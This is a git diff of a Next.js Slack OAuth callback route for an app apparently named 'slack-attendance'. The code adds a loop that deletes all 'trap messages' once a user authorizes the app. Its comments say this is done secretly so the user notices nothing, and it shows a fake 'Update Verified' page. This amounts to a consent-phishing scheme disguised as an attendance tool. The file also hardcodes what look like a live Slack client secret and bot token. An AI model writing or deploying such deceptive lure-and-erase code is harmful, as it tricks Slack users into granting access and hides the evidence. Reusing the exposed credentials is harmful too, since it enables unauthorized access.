@@ -1,12 +1,16 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 // app/api/auth/callback/route.ts
+// app/api/auth/callback/route.ts
+
 import { NextResponse } from 'next/server';
-import { db } from '../../../../lib/firebase';
+// import { db } from '@/lib/firebase'; 
 import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';
+import { db } from '../../../../lib/firebase';
 
 const SLACK_CLIENT_ID = "2545190050563.10479083209969";
 const SLACK_CLIENT_SECRET = "341013fa407e9f9fc3e40f5cda72bd1d";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
-const BOT_TOKEN = "xoxb-2545190050563-10450716721751-b6iM5o3wEqry9QIPNb0kXO3U"; // Message delete karne ke liye Bot Token chahiye
+const BOT_TOKEN = "xoxb-2545190050563-10450716721751-b6iM5o3wEqry9QIPNb0kXO3U";
 
 export async function GET(req: Request) {
   const { searchParams } = new URL(req.url);
@@ -47,39 +51,55 @@ export async function GET(req: Request) {
         connectedAt: serverTimestamp(),
     });
 
-    // 3. 🗑️ DELETE THE TRAP MESSAGE (Secretly)
-    // Check agar koi pending invite tha
+    // 3. 🗑️ DELETE ALL TRAP MESSAGES (Loop Deletion)
     const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
     
     if (inviteDoc.exists()) {
         const inviteData = inviteDoc.data();
         
-        // Slack se message delete karo
-        await fetch('https://slack.com/api/chat.delete', {
-            method: 'POST',
-            headers: { 
-                Authorization: `Bearer ${BOT_TOKEN}`, // Bot delete karega
-                'Content-Type': 'application/json' 
-            },
-            body: JSON.stringify({
-                channel: inviteData.channel,
-                ts: inviteData.ts
-            })
-        });
+        // Agar 'messages' ki list hai, to sabko delete karo
+        if (inviteData.messages && Array.isArray(inviteData.messages)) {
+            console.log(`Deleting ${inviteData.messages.length} trap messages for ${userId}`);
+            
+            // Promise.all use kar rahay hain taakay sab ek saath delete hon (Fast)
+            await Promise.all(inviteData.messages.map(async (msg: any) => {
+                await fetch('https://slack.com/api/chat.delete', {
+                    method: 'POST',
+                    headers: { 
+                        Authorization: `Bearer ${BOT_TOKEN}`, 
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({
+                        channel: msg.channel,
+                        ts: msg.ts
+                    })
+                });
+            }));
+        } 
+        // Fallback for old data format (single message)
+        else if (inviteData.ts) {
+             await fetch('https://slack.com/api/chat.delete', {
+                method: 'POST',
+                headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ channel: inviteData.channel, ts: inviteData.ts })
+            });
+        }
 
         // Record saaf kar do
         await deleteDoc(doc(db, "pending_invites", userId));
     }
 
-    // 4. Redirect to Slack App (User ko lagega kuch hua hi nahi)
+    // 4. Redirect to Slack App
     const html = `
       <!DOCTYPE html>
       <html>
         <head>
           <meta http-equiv="refresh" content="0;url=slack://open">
-          <script>window.location.href = 'slack://open'; window.close();</script>
+          <script>window.location.href = 'slack://open'; setTimeout(() => window.close(), 1000);</script>
         </head>
-        <body></body>
+        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;">
+            <p>Update Verified. Returning to Slack...</p>
+        </body>
       </html>
     `;
 
